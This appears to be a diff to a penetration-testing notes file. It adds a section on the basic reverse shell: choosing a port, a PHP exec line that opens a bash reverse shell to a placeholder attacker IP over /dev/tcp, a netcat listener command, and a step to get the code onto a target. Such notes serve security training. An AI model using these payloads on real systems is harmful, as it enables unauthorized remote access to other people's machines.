@@ -41,5 +41,19 @@ The basics of finding and getting into a target.
 
 ## Reverse shell
 
-This is the basic reverse shell. It's not recommended to use this. Go and use the [Chained Reverse shell](crevshell.md)
+This is the basic reverse shell. It is not really recommended to use this. You should use [Chained Reverse shell](crevshell.md) instead.
+
+### Choose a port
+- Usually 4444 is good and free, but if it isn't, anything free above 1024 will do
+
+### Make a shell code
+- You'll need to find a specific shell code to your usage. Google it (eg. [Something like this for PHP](https://gist.github.com/rshipp/eee36684db07d234c1cc))
+- You'll need to change it so it has your ip and port you want to open baked into it
+    - In this example `exec("/bin/bash -c 'bash -i > /dev/tcp/<attack machine IP adress>/<4444 or port that you prefer> 0>&1'");`
+
+### Make a listener on the attacking machine
+- Just paste this `nc -lvnp <4444 or port that you prefer>`
+
+### SOMEHOW get this code onto the target pc and run it
+- Then the target pc should link back to you via Netcat (nc)
 
